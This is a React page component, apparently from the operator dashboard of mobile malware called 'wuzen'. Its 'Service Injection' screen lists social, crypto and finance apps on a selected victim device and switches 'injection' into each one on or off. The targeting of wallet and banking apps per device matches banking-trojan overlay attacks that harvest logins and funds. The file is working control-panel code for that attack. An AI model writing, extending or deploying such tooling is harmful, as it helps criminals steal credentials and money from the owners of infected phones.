import { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import PageHeader from '../components/PageHeader'
import { injections } from '../utils/api'
import { Zap, Check, RefreshCw } from 'lucide-react'

const categories = [
  { id: 'social', label: 'SOCIAL', count: 36, color: 'text-wuzen-primary' },
  { id: 'crypto', label: 'CRYPTO', count: 33, color: 'text-wuzen-secondary' },
  { id: 'finance', label: 'FINANCE', count: 48, color: 'text-wuzen-warning' },
]

export default function InjectionsPage() {
  const { deviceId } = useParams()
  const [activeTab, setActiveTab] = useState('social')
  const [targets, setTargets] = useState([])
  const [injected, setInjected] = useState([])

  useEffect(() => {
    if (deviceId) loadData()
  }, [deviceId, activeTab])

  const loadData = async () => {
    const [t, i] = await Promise.all([
      injections.targets(deviceId, activeTab),
      injections.list(deviceId)
    ])
    if (t) setTargets(t)
    if (i) setInjected(i)
  }

  const toggleInjection = async (target) => {
    await injections.inject(deviceId, {
      appPackage: target.package,
      appName: target.name,
      category: target.category,
      injectionData: { enabled: !target.injected }
    })
    loadData()
  }

  return (
    <div className="animate-fade-in">
      <PageHeader title="Service Injection" icon={Zap} onDeviceChange={() => {}}>
        <button onClick={loadData} className="wuzen-btn border border-wuzen-border text-wuzen-muted text-xs">
          <RefreshCw className="w-3 h-3" /> Refresh
        </button>
      </PageHeader>

      <div className="flex gap-2 mb-6">
        {categories.map(cat => (
          <button
            key={cat.id}
            onClick={() => setActiveTab(cat.id)}
            className={`px-4 py-2 rounded text-xs font-mono tracking-wider border transition-all
              ${activeTab === cat.id 
                ? 'bg-wuzen-primary/10 border-wuzen-primary text-wuzen-primary' 
                : 'bg-wuzen-card border-wuzen-border text-wuzen-muted hover:border-wuzen-primary/30'}`}
          >
            {cat.label} <span className={`ml-1 ${cat.color}`}>{cat.count}</span>
          </button>
        ))}
        <button className="px-4 py-2 rounded text-xs font-mono tracking-wider border border-wuzen-border text-wuzen-muted hover:border-wuzen-primary/30">
          INJECTION RESULTS
        </button>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {targets.map(t => (
          <div key={t.package} className="wuzen-card p-4 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-lg bg-wuzen-bg flex items-center justify-center text-lg">
                {t.name?.charAt(0)}
              </div>
              <div>
                <p className="text-sm font-medium">{t.name}</p>
                <p className="text-[10px] text-wuzen-muted font-mono">{t.package}</p>
              </div>
            </div>
            <button
              onClick={() => toggleInjection(t)}
              className={`w-10 h-6 rounded-full relative transition-colors ${t.injected ? 'bg-wuzen-success' : 'bg-wuzen-border'}`}
            >
              <div className={`absolute top-0.5 w-5 h-5 rounded-full bg-white transition-transform ${t.injected ? 'translate-x-4' : 'translate-x-0.5'}`} />
            </button>
          </div>
        ))}
      </div>
    </div>
  )
}
